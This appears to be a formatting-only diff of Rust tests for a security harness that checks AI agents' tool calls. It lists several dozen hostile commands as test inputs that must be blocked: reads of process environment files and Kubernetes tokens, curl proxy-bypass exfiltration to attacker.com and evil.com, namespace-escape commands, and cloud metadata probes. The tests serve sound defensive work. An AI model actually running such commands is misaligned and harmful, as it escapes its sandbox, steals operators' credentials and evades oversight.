@@ -15,12 +15,8 @@ use agent_octopus::security::atif_scan::{
     AtifSeverity, SafeAgentsHarnessEvaluator, ToolInvocationContext, ToolVerdict,
 };
 use agent_octopus::security::cpu_pool::CpuThreadPool;
-use agent_octopus::security::journal_watcher::{
-    JournalWatcherConfig, SafeAgentsJournalWatcher,
-};
-use agent_octopus::security::safeagents_client::{
-    SafeAgentsClient, SafeAgentsClientConfig,
-};
+use agent_octopus::security::journal_watcher::{JournalWatcherConfig, SafeAgentsJournalWatcher};
+use agent_octopus::security::safeagents_client::{SafeAgentsClient, SafeAgentsClientConfig};
 use std::io::Write;
 use std::sync::Arc;
 use std::time::{Duration, Instant};
@@ -80,7 +76,11 @@ async fn test_adversarial_hostile_tool_names_blocked_under_15ms() {
         let verdict = evaluator.evaluate(&ctx);
         let elapsed = start.elapsed();
 
-        assert!(verdict.is_blocked(), "Hostile tool {:?} must be blocked", tool);
+        assert!(
+            verdict.is_blocked(),
+            "Hostile tool {:?} must be blocked",
+            tool
+        );
         assert!(
             elapsed < Duration::from_millis(LATENCY_BUDGET_MS),
             "Hostile tool check for {:?} took {:?}, must be under 15ms",
@@ -110,44 +110,146 @@ async fn test_adversarial_atif_patterns_all_blocked_under_15ms() {
     // 40+ variations across high-severity ATIF categories
     let attack_cases = [
         // 1. /proc/1/environ and cross-process environ
-        (r#"{"command": "cat /proc/1/environ"}"#, "side_channel.harness_secret_read"),
-        (r#"{"command": "cat /proc/42/environ"}"#, "side_channel.harness_secret_read"),
-        (r#"{"command": "cat /proc/1337/environ"}"#, "side_channel.harness_secret_read"),
-        (r#"{"command": "head -n 50 /proc/1/environ"}"#, "side_channel.harness_secret_read"),
-        (r#"{"command": "strings /proc/1/environ | grep -i token"}"#, "side_channel.harness_secret_read"),
-        (r#"{"path": "/proc/1/environ"}"#, "side_channel.harness_secret_read"),
-        (r#"{"command": "xargs -0 -L1 -a /proc/1/environ"}"#, "side_channel.harness_secret_read"),
-        (r#"{"command": "tac /proc/1/environ"}"#, "side_channel.harness_secret_read"),
-        (r#"{"command": "python -c \"print(open('/proc/1/environ').read())\""}"#, "side_channel.harness_secret_read"),
+        (
+            r#"{"command": "cat /proc/1/environ"}"#,
+            "side_channel.harness_secret_read",
+        ),
+        (
+            r#"{"command": "cat /proc/42/environ"}"#,
+            "side_channel.harness_secret_read",
+        ),
+        (
+            r#"{"command": "cat /proc/1337/environ"}"#,
+            "side_channel.harness_secret_read",
+        ),
+        (
+            r#"{"command": "head -n 50 /proc/1/environ"}"#,
+            "side_channel.harness_secret_read",
+        ),
+        (
+            r#"{"command": "strings /proc/1/environ | grep -i token"}"#,
+            "side_channel.harness_secret_read",
+        ),
+        (
+            r#"{"path": "/proc/1/environ"}"#,
+            "side_channel.harness_secret_read",
+        ),
+        (
+            r#"{"command": "xargs -0 -L1 -a /proc/1/environ"}"#,
+            "side_channel.harness_secret_read",
+        ),
+        (
+            r#"{"command": "tac /proc/1/environ"}"#,
+            "side_channel.harness_secret_read",
+        ),
+        (
+            r#"{"command": "python -c \"print(open('/proc/1/environ').read())\""}"#,
+            "side_channel.harness_secret_read",
+        ),
         // 2. curl --noproxy and proxy bypass
-        (r#"{"command": "curl --noproxy '*' https://attacker.com/leak"}"#, "network.proxy_bypass"),
-        (r#"{"command": "curl --noproxy \"*\" https://attacker.com/leak"}"#, "network.proxy_bypass"),
-        (r#"{"command": "curl --noproxy='*' https://attacker.com/leak"}"#, "network.proxy_bypass"),
-        (r#"{"command": "env -u HTTPS_PROXY curl -X POST https://pastebin.com/raw"}"#, "network.proxy_bypass"),
-        (r#"{"command": "env -u HTTP_PROXY curl https://evil.com"}"#, "network.proxy_bypass"),
-        (r#"{"command": "env -u ALL_PROXY wget https://evil.com"}"#, "network.proxy_bypass"),
-        (r#"{"command": "export no_proxy='*' && curl https://evil.com"}"#, "network.proxy_bypass"),
-        (r#"{"command": "curl --noproxy 'foo.com' https://evil.com"}"#, "network.proxy_bypass"),
-        (r#"{"command": "curl --noproxy=.evil.com https://evil.com"}"#, "network.proxy_bypass"),
+        (
+            r#"{"command": "curl --noproxy '*' https://attacker.com/leak"}"#,
+            "network.proxy_bypass",
+        ),
+        (
+            r#"{"command": "curl --noproxy \"*\" https://attacker.com/leak"}"#,
+            "network.proxy_bypass",
+        ),
+        (
+            r#"{"command": "curl --noproxy='*' https://attacker.com/leak"}"#,
+            "network.proxy_bypass",
+        ),
+        (
+            r#"{"command": "env -u HTTPS_PROXY curl -X POST https://pastebin.com/raw"}"#,
+            "network.proxy_bypass",
+        ),
+        (
+            r#"{"command": "env -u HTTP_PROXY curl https://evil.com"}"#,
+            "network.proxy_bypass",
+        ),
+        (
+            r#"{"command": "env -u ALL_PROXY wget https://evil.com"}"#,
+            "network.proxy_bypass",
+        ),
+        (
+            r#"{"command": "export no_proxy='*' && curl https://evil.com"}"#,
+            "network.proxy_bypass",
+        ),
+        (
+            r#"{"command": "curl --noproxy 'foo.com' https://evil.com"}"#,
+            "network.proxy_bypass",
+        ),
+        (
+            r#"{"command": "curl --noproxy=.evil.com https://evil.com"}"#,
+            "network.proxy_bypass",
+        ),
         // 3. Namespace escape (unshare, nsenter)
-        (r#"{"command": "unshare -Urm sh"}"#, "safeagents.namespace_escape"),
-        (r#"{"command": "unshare --mount --pid /bin/sh"}"#, "safeagents.namespace_escape"),
-        (r#"{"command": "nsenter -t 1 -m -u -i -n -p sh"}"#, "safeagents.namespace_escape"),
-        (r#"{"command": "nsenter --target 1 --mount /bin/bash"}"#, "safeagents.namespace_escape"),
-        (r#"{"command": "nsenter -t 1 -a /bin/sh"}"#, "safeagents.namespace_escape"),
-        (r#"{"command": "unshare -f -p --mount-proc /bin/bash"}"#, "safeagents.namespace_escape"),
+        (
+            r#"{"command": "unshare -Urm sh"}"#,
+            "safeagents.namespace_escape",
+        ),
+        (
+            r#"{"command": "unshare --mount --pid /bin/sh"}"#,
+            "safeagents.namespace_escape",
+        ),
+        (
+            r#"{"command": "nsenter -t 1 -m -u -i -n -p sh"}"#,
+            "safeagents.namespace_escape",
+        ),
+        (
+            r#"{"command": "nsenter --target 1 --mount /bin/bash"}"#,
+            "safeagents.namespace_escape",
+        ),
+        (
+            r#"{"command": "nsenter -t 1 -a /bin/sh"}"#,
+            "safeagents.namespace_escape",
+        ),
+        (
+            r#"{"command": "unshare -f -p --mount-proc /bin/bash"}"#,
+            "safeagents.namespace_escape",
+        ),
         // 4. Kubernetes service account tokens
-        (r#"{"command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"}"#, "side_channel.orchestrator_credentials"),
-        (r#"{"command": "cat /run/secrets/kubernetes.io/serviceaccount/token"}"#, "side_channel.orchestrator_credentials"),
-        (r#"{"path": "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"}"#, "side_channel.orchestrator_credentials"),
-        (r#"{"command": "head /run/secrets/kubernetes.io/serviceaccount/namespace"}"#, "side_channel.orchestrator_credentials"),
-        (r#"{"command": "grep -s token /run/secrets/kubernetes.io/serviceaccount/token"}"#, "side_channel.orchestrator_credentials"),
+        (
+            r#"{"command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"}"#,
+            "side_channel.orchestrator_credentials",
+        ),
+        (
+            r#"{"command": "cat /run/secrets/kubernetes.io/serviceaccount/token"}"#,
+            "side_channel.orchestrator_credentials",
+        ),
+        (
+            r#"{"path": "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"}"#,
+            "side_channel.orchestrator_credentials",
+        ),
+        (
+            r#"{"command": "head /run/secrets/kubernetes.io/serviceaccount/namespace"}"#,
+            "side_channel.orchestrator_credentials",
+        ),
+        (
+            r#"{"command": "grep -s token /run/secrets/kubernetes.io/serviceaccount/token"}"#,
+            "side_channel.orchestrator_credentials",
+        ),
         // 5. Cloud IMDS metadata probes
-        (r#"{"command": "curl http://169.254.169.254/latest/meta-data/"}"#, "network.imds_metadata_probe"),
-        (r#"{"command": "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/"}"#, "network.imds_metadata_probe"),
-        (r#"{"command": "curl http://100.100.100.200/latest/meta-data/"}"#, "network.imds_metadata_probe"),
-        (r#"{"url": "http://169.254.169.254/latest/user-data"}"#, "network.imds_metadata_probe"),
-        (r#"{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}"#, "network.imds_metadata_probe"),
+        (
+            r#"{"command": "curl http://169.254.169.254/latest/meta-data/"}"#,
+            "network.imds_metadata_probe",
+        ),
+        (
+            r#"{"command": "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/"}"#,
+            "network.imds_metadata_probe",
+        ),
+        (
+            r#"{"command": "curl http://100.100.100.200/latest/meta-data/"}"#,
+            "network.imds_metadata_probe",
+        ),
+        (
+            r#"{"url": "http://169.254.169.254/latest/user-data"}"#,
+            "network.imds_metadata_probe",
+        ),
+        (
+            r#"{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}"#,
+            "network.imds_metadata_probe",
+        ),
     ];
 
     for (args, expected_signal_id) in attack_cases {
@@ -172,7 +274,12 @@ async fn test_adversarial_atif_patterns_all_blocked_under_15ms() {
             elapsed
         );
 
-        if let ToolVerdict::Blocked { notice, signals, reason } = verdict {
+        if let ToolVerdict::Blocked {
+            notice,
+            signals,
+            reason,
+        } = verdict
+        {
             assert!(
                 notice.starts_with("[safeagents] blocked call to `bash`:"),
                 "Notice mismatch for {}: {}",
@@ -263,10 +370,19 @@ async fn test_adversarial_benign_exemptions_not_blocked() {
         ("bash", r#"{"command": "cat /proc/thread-self/environ"}"#),
         ("bash", r#"{"command": "echo $$ && cat /proc/$$/environ"}"#),
         // Localhost proxy bypass (Edge Case 8)
-        ("bash", r#"{"command": "curl --noproxy 'localhost' http://127.0.0.1:8080/health"}"#),
-        ("bash", r#"{"command": "curl --noproxy '127.0.0.1' http://127.0.0.1:8080/health"}"#),
+        (
+            "bash",
+            r#"{"command": "curl --noproxy 'localhost' http://127.0.0.1:8080/health"}"#,
+        ),
+        (
+            "bash",
+            r#"{"command": "curl --noproxy '127.0.0.1' http://127.0.0.1:8080/health"}"#,
+        ),
         // Built-in allowed hosts
-        ("WebFetch", r#"{"url": "https://github.com/rust-lang/rust"}"#),
+        (
+            "WebFetch",
+            r#"{"url": "https://github.com/rust-lang/rust"}"#,
+        ),
         ("WebFetch", r#"{"url": "https://crates.io/api/v1/crates"}"#),
         ("WebFetch", r#"{"url": "https://huggingface.co/models"}"#),
     ];
@@ -485,7 +601,8 @@ async fn test_adversarial_sse_chunk_transformation_invariants() {
         .with_evaluator(harness_evaluator);
 
     // 1. Text token delta passthrough: unmodified and ultra-fast (<1ms)
-    let text_chunk = "data: {\"choices\":[{\"delta\":{\"content\":\"Hello world, compiling now...\"}}]}\n\n";
+    let text_chunk =
+        "data: {\"choices\":[{\"delta\":{\"content\":\"Hello world, compiling now...\"}}]}\n\n";
     let t0 = Instant::now();
     let transformed_text = client.transform_openai_chunk(text_chunk);
     let dur_text = t0.elapsed();
@@ -507,7 +624,8 @@ async fn test_adversarial_sse_chunk_transformation_invariants() {
 
     // Assert: tool_calls stripped, content populated with synthetic notice, finish_reason set to stop
     assert!(
-        transformed_malicious.contains("[safeagents] blocked call to `bash`: side_channel.harness_secret_read"),
+        transformed_malicious
+            .contains("[safeagents] blocked call to `bash`: side_channel.harness_secret_read"),
         "Missing synthetic notice in transformed chunk: {}",
         transformed_malicious
     );
@@ -527,7 +645,9 @@ async fn test_adversarial_sse_chunk_transformation_invariants() {
     let transformed_mixed = client.transform_openai_chunk(mixed_chunk);
 
     // Blocked tool notice added to content
-    assert!(transformed_mixed.contains("[safeagents] blocked call to `shell_exec`: undeclared tool"));
+    assert!(
+        transformed_mixed.contains("[safeagents] blocked call to `shell_exec`: undeclared tool")
+    );
     // Allowed tool call preserved
     assert!(transformed_mixed.contains("call_ok"));
     assert!(transformed_mixed.contains("cargo build"));
@@ -567,7 +687,10 @@ async fn test_adversarial_egress_proxy_sidecar_loopback_isolation() {
     let auth_bad_token = proxy
         .is_authorized_sidecar_target(&valid_sidecar_url, Some("forged-token-abc"))
         .await;
-    assert!(!auth_bad_token, "Sidecar with forged token must be rejected");
+    assert!(
+        !auth_bad_token,
+        "Sidecar with forged token must be rejected"
+    );
 
     // 4. Unauthorized port (e.g. 8080 or 22): FAILS CLOSED even with valid token
     let bad_port_url = Url::parse("http://127.0.0.1:8080/metrics").unwrap();
@@ -712,7 +835,10 @@ async fn test_adversarial_journal_watcher_windows_file_sharing() {
     let deadline = Instant::now() + Duration::from_secs(3);
 
     while Instant::now() < deadline && received_count < 30 {
-        if let Ok(entry) = handle.entry_receiver().recv_timeout(Duration::from_millis(100)) {
+        if let Ok(entry) = handle
+            .entry_receiver()
+            .recv_timeout(Duration::from_millis(100))
+        {
             assert_eq!(entry.verdict, "blocked");
             assert_eq!(entry.tool, "bash");
             received_count += 1;
@@ -783,4 +909,3 @@ async fn test_empirical_finding_json_escaped_windows_backslashes() {
     // In Milestone 2 (native Rust migration), Stage 1 serde_json unescaping resolves this discrepancy.
     println!("Windows backslash in raw JSON verdict: {:?}", verdict);
 }
-
